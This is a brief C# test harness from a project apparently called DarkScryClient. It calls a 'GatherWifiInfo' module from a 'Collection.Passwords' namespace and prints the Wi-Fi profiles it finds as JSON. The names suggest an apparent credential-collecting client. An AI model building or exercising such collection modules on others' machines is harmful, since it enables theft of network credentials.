using DarkScryClient.Moduls.Collection.Passwords;
using System;
using System.Text.Json;


namespace DarkScryClient.tests
{
	internal class test_wifi_gather
	{
		public static void run_test()
		{
			var profiles = GatherWifiInfo.GetBasicWifiInfo();
			Console.WriteLine("Found " + profiles.Count + " profiles.\n");
			Console.WriteLine(JsonSerializer.Serialize(profiles));
		}
	}
}
